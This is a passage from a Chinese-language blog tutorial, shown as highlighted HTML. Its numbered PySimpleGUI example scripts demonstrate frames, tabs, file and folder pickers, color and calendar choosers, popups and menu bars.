class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"30通过框架元素更新实现界面切换-py\"><a href=\"#30通过框架元素更新实现界面切换-py\" class=\"headerlink\" title=\"30通过框架元素更新实现界面切换.py\"></a>30通过框架元素更新实现界面切换.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update(visible=None)</span></span><br><span class=\"line\"><span class=\"string\">可更新的属性：</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 框架元素的标题</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"built_in\">list</span>=[<span class=\"string\">&#x27;资料1&#x27;</span>,<span class=\"string\">&#x27;资料2&#x27;</span>,<span class=\"string\">&#x27;资料3&#x27;</span>,<span class=\"string\">&#x27;资料4&#x27;</span>]</span><br><span class=\"line\">layouta = [</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;账号&#x27;</span>), sg.In()],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;密码&#x27;</span>), sg.In()],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;确定&#x27;</span>),sg.B(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">layoutb=[</span><br><span class=\"line\">    [sg.LB(<span class=\"built_in\">list</span>,size=(<span class=\"number\">30</span>,<span class=\"number\">5</span>))]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">layout = [</span><br><span class=\"line\">    [sg.Frame(title=<span class=\"string\">&#x27;登录框&#x27;</span>, layout=layouta,key=<span class=\"string\">&#x27;-a-&#x27;</span>),</span><br><span class=\"line\">     sg.Frame(title=<span class=\"string\">&#x27;资料列表&#x27;</span>,layout=layoutb,visible=<span class=\"literal\">False</span>,key=<span class=\"string\">&#x27;-b-&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;确定&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-a-&#x27;</span>].update(visible=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-b-&#x27;</span>].update(visible=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"31标签元素的讲解及练习-py\"><a href=\"#31标签元素的讲解及练习-py\" class=\"headerlink\" title=\"31标签元素的讲解及练习.py\"></a>31标签元素的讲解及练习.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">什么是标签元素：</span></span><br><span class=\"line\"><span class=\"string\">一种容器元素，里面可以放置各种元素及布局。优点在于切界更为便捷。书写方式与别的元素稍有不同。</span></span><br><span class=\"line\"><span class=\"string\">书写方式：</span></span><br><span class=\"line\"><span class=\"string\">sg.TabGroup([[sg.Tab(&#x27;Tab1&#x27;,tab1_layout,),sg.Tab(&#x27;Tab2&#x27;,tab2_layout,)]],)</span></span><br><span class=\"line\"><span class=\"string\">单个标签可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">            background_color=&#x27;black&#x27;,  # 背景色</span></span><br><span class=\"line\"><span class=\"string\">            relief=None,  # 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            disabled=False, # 禁用状态设定</span></span><br><span class=\"line\"><span class=\"string\">            pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class=\"line\"><span class=\"string\">            font=None, # 可以设置字体名称，大小等。</span></span><br><span class=\"line\"><span class=\"string\">            border_width=10, # 框架元素的线条宽度</span></span><br><span class=\"line\"><span class=\"string\">            tooltip=None, # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">            right_click_menu=None, # 右击调出菜单</span></span><br><span class=\"line\"><span class=\"string\">            key=None, # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">            visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\">            element_justification=&quot;center&quot;, # 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">整个标签元素可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">layout, # 标签组内的tab布局，注意sg.Tab()要写在第一行</span></span><br><span class=\"line\"><span class=\"string\">tab_location=None, # 标签标题所处位置，有效值有12个，分别为left,right,top,bottom,lefttop,leftbuttom,</span></span><br><span class=\"line\"><span class=\"string\">                    righttop,rightbottom,bottomleft,bottomright,topleft,topright</span></span><br><span class=\"line\"><span class=\"string\">title_color=None, # 标题文本颜色（未选中时）</span></span><br><span class=\"line\"><span class=\"string\">tab_background_color=None, # 所有标签背景颜色（未选中时）</span></span><br><span class=\"line\"><span class=\"string\">selected_title_color=None, # 选中时标题文本颜色</span></span><br><span class=\"line\"><span class=\"string\">selected_background_color=None, # 选中时标签背景颜色（未选中时）</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  # 标签标题所在空白区域的背景色</span></span><br><span class=\"line\"><span class=\"string\">pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class=\"line\"><span class=\"string\">font=None, # 可以设置字体名称，大小等。</span></span><br><span class=\"line\"><span class=\"string\">enable_events=False, # 元素的事件属性，切换标签元素就会发生事件</span></span><br><span class=\"line\"><span class=\"string\">border_width=10, # 边界线宽度</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None, # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">right_click_menu=None, # 右击调出菜单</span></span><br><span class=\"line\"><span class=\"string\">key=None, # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">title=None, # 标签标题文本的更新</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 禁用状态更新</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 可见状态更新</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">lista=[<span class=\"string\">&#x27;苹果&#x27;</span>,<span class=\"string\">&#x27;香蕉&#x27;</span>,<span class=\"string\">&#x27;雪梨&#x27;</span>,<span class=\"string\">&#x27;西瓜&#x27;</span>]</span><br><span class=\"line\">listb=[<span class=\"string\">&#x27;白菜&#x27;</span>,<span class=\"string\">&#x27;芥菜&#x27;</span>,<span class=\"string\">&#x27;包菜&#x27;</span>,<span class=\"string\">&#x27;生菜&#x27;</span>]</span><br><span class=\"line\">tab1_layout=[[sg.LB(lista,size=(<span class=\"number\">50</span>,<span class=\"number\">5</span>))]]</span><br><span class=\"line\">tab2_layout=[[sg.LB(listb,size=(<span class=\"number\">50</span>,<span class=\"number\">5</span>))]]</span><br><span class=\"line\">layout=[[sg.TabGroup([[sg.Tab(<span class=\"string\">&#x27;水果类&#x27;</span>,tab1_layout),sg.Tab(<span class=\"string\">&#x27;蔬菜类&#x27;</span>,tab2_layout)]])]]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout,keep_on_top=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">result=<span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"32编写一个文件选择器-py\"><a href=\"#32编写一个文件选择器-py\" class=\"headerlink\" title=\"32编写一个文件选择器.py\"></a>32编写一个文件选择器.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">button_text=&quot;Browse&quot;, # 按钮元素上要显示的文本</span></span><br><span class=\"line\"><span class=\"string\">target=key, # 显示路径的目标元素的key</span></span><br><span class=\"line\"><span class=\"string\">file_types=((&#x27;ALL Files&#x27;,&#x27;*.png&#x27;),), # 只显示指定的文件类型 ‘*.pdf’ # 只显示指定的文件名称 ‘text.*’</span></span><br><span class=\"line\"><span class=\"string\">initial_folder=None, # 默认路径设定</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None, # str:悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">size=(None,None) #</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.FilesBrowse(button_text=<span class=\"string\">&quot;选择文件&quot;</span>,target=<span class=\"string\">&#x27;-a-&#x27;</span>,file_types=((<span class=\"string\">&#x27;ALL Files&#x27;</span>,<span class=\"string\">&#x27;*.png&#x27;</span>),),initial_folder=<span class=\"string\">r&quot;c:\\\\&quot;</span>), \\</span><br><span class=\"line\">    sg.In(key=<span class=\"string\">&#x27;-IN-&#x27;</span>),sg.In(key=<span class=\"string\">&#x27;-a-&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout,keep_on_top=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"33文件夹选择器与文件另存为-py\"><a href=\"#33文件夹选择器与文件另存为-py\" class=\"headerlink\" title=\"33文件夹选择器与文件另存为.py\"></a>33文件夹选择器与文件另存为.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">文件夹选择器的书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.FolderBrowse()</span></span><br><span class=\"line\"><span class=\"string\">文件另存为的书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.FileSaveAs()</span></span><br><span class=\"line\"><span class=\"string\">主要属性</span></span><br><span class=\"line\"><span class=\"string\">button_text=&quot;Save As...&quot;, # 按键文本</span></span><br><span class=\"line\"><span class=\"string\">target=key, # 指定显示的元素</span></span><br><span class=\"line\"><span class=\"string\">file_types=((&#x27;ALL Files&#x27;,&#x27;*.*&#x27;),),  # 设定文件名和文件类型(文件夹选择器没有)</span></span><br><span class=\"line\"><span class=\"string\">initial_folder=None, # 设定默认路径</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.FilesBrowse(button_text=<span class=\"string\">&quot;选择文件&quot;</span>),sg.In()],</span><br><span class=\"line\">    [sg.FolderBrowse(button_text=<span class=\"string\">&quot;选择文件夹&quot;</span>,target=<span class=\"string\">&#x27;1&#x27;</span>),sg.In(key=<span class=\"string\">&#x27;1&#x27;</span>),sg.In(),],</span><br><span class=\"line\">    [sg.FileSaveAs(button_text=<span class=\"string\">&quot;另存为&quot;</span>,target=<span class=\"string\">&#x27;2&#x27;</span>),sg.In(),sg.In(key=<span class=\"string\">&#x27;2&#x27;</span>),sg.In()]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"34颜色选择器和日历选择器-py\"><a href=\"#34颜色选择器和日历选择器-py\" class=\"headerlink\" title=\"34颜色选择器和日历选择器.py\"></a>34颜色选择器和日历选择器.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">颜色选择器的属性</span></span><br><span class=\"line\"><span class=\"string\">button_text, 按钮元素要显示的文本</span></span><br><span class=\"line\"><span class=\"string\">target=key, 显示颜色码的目标元素的key</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">日历选择器</span></span><br><span class=\"line\"><span class=\"string\">button_text, 按钮上显示的文本</span></span><br><span class=\"line\"><span class=\"string\">target=(key), 选择的日期要显示的位置</span></span><br><span class=\"line\"><span class=\"string\">close_when_date_chosen=True, 选择日期后，日历界面关闭</span></span><br><span class=\"line\"><span class=\"string\">default_date_m_d_y=(None,None,None), 默认值设定</span></span><br><span class=\"line\"><span class=\"string\">locale=None, 区域设定，西班牙：es</span></span><br><span class=\"line\"><span class=\"string\">format=&quot;%Y-%m-%d %H:%M:%S&quot;, 显示的格式</span></span><br><span class=\"line\"><span class=\"string\">begin_at_sunday_plus=0, 指定日历显示的第一列</span></span><br><span class=\"line\"><span class=\"string\">month_names=month, 指定月份的文本列表</span></span><br><span class=\"line\"><span class=\"string\">day_abbreviations=week, # 指定周几的文本列表</span></span><br><span class=\"line\"><span class=\"string\">title=&quot;Choose Date&quot;, 选择窗口的标题</span></span><br><span class=\"line\"><span class=\"string\">no_titlebar=True, 不显示标题</span></span><br><span class=\"line\"><span class=\"string\">location=(None,None), 日历窗口的位置</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">month=[<span class=\"string\">&#x27;1月&#x27;</span>,<span class=\"string\">&#x27;2月&#x27;</span>,<span class=\"string\">&#x27;3月&#x27;</span>,<span class=\"string\">&#x27;4月&#x27;</span>,<span class=\"string\">&#x27;5月&#x27;</span>,<span class=\"string\">&#x27;6月&#x27;</span>,<span class=\"string\">&#x27;7月&#x27;</span>,<span class=\"string\">&#x27;8月&#x27;</span>,<span class=\"string\">&#x27;9月&#x27;</span>,<span class=\"string\">&#x27;10月&#x27;</span>,<span class=\"string\">&#x27;11月&#x27;</span>,<span class=\"string\">&#x27;12月&#x27;</span>]</span><br><span class=\"line\">week=[<span class=\"string\">&#x27;周日&#x27;</span>,<span class=\"string\">&#x27;周一&#x27;</span>,<span class=\"string\">&#x27;周二&#x27;</span>,<span class=\"string\">&#x27;周三&#x27;</span>,<span class=\"string\">&#x27;周四&#x27;</span>,<span class=\"string\">&#x27;周五&#x27;</span>,<span class=\"string\">&#x27;周六&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.ColorChooserButton(button_text=<span class=\"string\">&quot;颜色选择器&quot;</span>),sg.In()],</span><br><span class=\"line\">    [sg.CalendarButton(button_text=<span class=\"string\">&quot;日历选择器&quot;</span>),sg.In()]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"35关于弹窗的各种设定-py\"><a href=\"#35关于弹窗的各种设定-py\" class=\"headerlink\" title=\"35关于弹窗的各种设定.py\"></a>35关于弹窗的各种设定.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">a=sg.Popup(<span class=\"string\">&#x27;程序员无声&#x27;</span>,<span class=\"string\">&#x27;程序员小胖&#x27;</span>*<span class=\"number\">5</span>,</span><br><span class=\"line\">         title=<span class=\"string\">&#x27;弹窗演示&#x27;</span>, <span class=\"comment\"># 弹窗标题，如果未设定，则默认显示可变参数的第一个文本作为标题</span></span><br><span class=\"line\">         button_color=(<span class=\"string\">&#x27;red&#x27;</span>,<span class=\"string\">&#x27;black&#x27;</span>), <span class=\"comment\"># # 文本颜色，背景颜色</span></span><br><span class=\"line\">         background_color=<span class=\"string\">&#x27;black&#x27;</span>, <span class=\"comment\"># 弹窗的背景颜色</span></span><br><span class=\"line\">         text_color=<span class=\"string\">&#x27;red&#x27;</span>, <span class=\"comment\"># 弹窗上面的文本颜色</span></span><br><span class=\"line\">         auto_close=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果设定为True，弹窗会自动关闭界面</span></span><br><span class=\"line\">         auto_close_duration=<span class=\"literal\">None</span>, <span class=\"comment\"># 自动关闭窗口之前界面持续的时间（以秒为单位）</span></span><br><span class=\"line\">         custom_text=(<span class=\"string\">&#x27;yes&#x27;</span>,<span class=\"string\">&#x27;no&#x27;</span>), <span class=\"comment\"># 自定义按钮上要显示的文本，可以设定一个或者两个</span></span><br><span class=\"line\">         non_blocking=<span class=\"literal\">False</span>, <span class=\"comment\"># 非阻塞设定，如果为True，立即执行下一步，不需要等待用户的输入</span></span><br><span class=\"line\">         font=<span class=\"literal\">None</span>, <span class=\"comment\"># 字体大小，名称设定</span></span><br><span class=\"line\">         no_titlebar=<span class=\"literal\">False</span>, <span class=\"comment\"># 不显示标题栏</span></span><br><span class=\"line\">         grab_anywhere=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True, 拖动界面进行移动</span></span><br><span class=\"line\">         keep_on_top=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True， 保持界面在屏幕的最前方</span></span><br><span class=\"line\">         location=(<span class=\"literal\">None</span>,<span class=\"literal\">None</span>), <span class=\"comment\"># 界面出现的位置</span></span><br><span class=\"line\">         any_key_closes=<span class=\"literal\">False</span>, <span class=\"comment\"># 如果为True，敲打任意键盘就会关闭页面，如果为False，只用X关闭按钮，用户选择，以及回车键才会关闭窗口</span></span><br><span class=\"line\">         image=<span class=\"literal\">None</span>, <span class=\"comment\"># 显示图片（支持base64）</span></span><br><span class=\"line\">         modal=<span class=\"literal\">True</span>, <span class=\"comment\"># 模态窗口设定，除非关闭此窗口否则其他界面不能进行操作</span></span><br><span class=\"line\"></span><br><span class=\"line\">         )</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"36弹窗之PopupGetText-py\"><a href=\"#36弹窗之PopupGetText-py\" class=\"headerlink\" title=\"36弹窗之PopupGetText.py\"></a>36弹窗之PopupGetText.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">pwd=<span class=\"string\">&#x27;123&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">list</span>=[<span class=\"string\">&#x27;python学习资料&#x27;</span>,<span class=\"string\">&#x27;java学习资料&#x27;</span>,<span class=\"string\">&#x27;php学习资料&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    result = sg.PopupGetText(<span class=\"string\">&#x27;密码输入框&#x27;</span>, password_char=<span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> result == pwd:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> result == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        exit()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        sg.Popup(<span class=\"string\">&#x27;输入有误&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.LB(<span class=\"built_in\">list</span>,size=(<span class=\"number\">30</span>,<span class=\"number\">5</span>))],</span><br><span class=\"line\">]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;资料查询&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"37各种不同特征的弹窗-py\"><a href=\"#37各种不同特征的弹窗-py\" class=\"headerlink\" title=\"37各种不同特征的弹窗.py\"></a>37各种不同特征的弹窗.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">文件选择弹窗</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupGetFile() or sg.Popup_get_file()</span></span><br><span class=\"line\"><span class=\"string\">文件夹选择器</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupGetFolder() or sg.popup_get_folder()</span></span><br><span class=\"line\"><span class=\"string\">没有标题栏的弹窗，可以随意移动窗口</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupAnnoying()</span></span><br><span class=\"line\"><span class=\"string\">显示一段时间后自动关闭窗口</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupAutoClose()</span></span><br><span class=\"line\"><span class=\"string\">含有一个Cancelled的按钮</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupCancel()</span></span><br><span class=\"line\"><span class=\"string\">弹窗含有ok和cancel两个按钮</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupOKCancel()</span></span><br><span class=\"line\"><span class=\"string\">含有一个带颜色的Error按钮</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupError()</span></span><br><span class=\"line\"><span class=\"string\">显示无按钮的弹窗</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupNoButtons()</span></span><br><span class=\"line\"><span class=\"string\">显示弹出窗口并立即返回</span></span><br><span class=\"line\"><span class=\"string\">sg.PopupNoWait()</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">result=sg.PopupAnnoying(<span class=\"string\">&#x27;演示弹窗&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"38菜单栏的设定方法-py\"><a href=\"#38菜单栏的设定方法-py\" class=\"headerlink\" title=\"38菜单栏的设定方法.py\"></a>38菜单栏的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">menu=[</span><br><span class=\"line\">    [<span class=\"string\">&#x27;文件(&amp;F)&#x27;</span>,[<span class=\"string\">&#x27;新建&#x27;</span>,<span class=\"string\">&#x27;打开&#x27;</span>,<span class=\"string\">&#x27;!保存&#x27;</span>,<span class=\"string\">&#x27;---&#x27;</span>,<span class=\"string\">&#x27;退出&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;编辑&#x27;</span>,[<span class=\"string\">&#x27;撤销&#x27;</span>,<span class=\"string\">&#x27;重做&#x27;</span>,<span class=\"string\">&#x27;剪切&#x27;</span>,<span class=\"string\">&#x27;保存&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;帮助&#x27;</span>,[<span class=\"string\">&#x27;检查更新&#x27;</span>,<span class=\"string\">&#x27;使用指南&#x27;</span>,<span class=\"string\">&#x27;关于&#x27;</span>]]</span><br><span class=\"line\">]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Menu(menu)],</span><br><span class=\"line\">    [[sg.In()] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">window = sg.Window(<span class=\"string\">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event, values = window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"39菜单栏的重点补充-py\"><a href=\"#39菜单栏的重点补充-py\" class=\"headerlink\" title=\"39菜单栏的重点补充.py\"></a>39菜单栏的重点补充.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">menu=[</span><br><span class=\"line\">    [<span class=\"string\">&#x27;文件(&amp;F)&#x27;</span>,[<span class=\"string\">&#x27;新建&#x27;</span>,<span class=\"string\">&#x27;打开::open&#x27;</span>,<span class=\"string\">&#x27;!保存&#x27;</span>,<span class=\"string\">&#x27;---&#x27;</span>,<span class=\"string\">&#x27;退出&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;编辑&#x27;</span>,[<span class=\"string\">&#x27;撤销&#x27;</span>,<span class=\"string\">&#x27;重做&#x27;</span>,<span class=\"string\">&#x27;剪切&#x27;</span>,<span class=\"string\">&#x27;保存&#x27;</span>]],</span><br><span class=\"line\">    [<span class=\"string\">&#x27;帮助&#x27;</span>,[<span class=\"string\">&#x27;检查更新&#x27;</span>,<span class=\"string\">&#x27;使用指南&#x27;</span>,<span class=\"string\">&#x27;关于&#x27;</span>]]</span><br><span class=\"line\">]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Menu(menu,key=<span 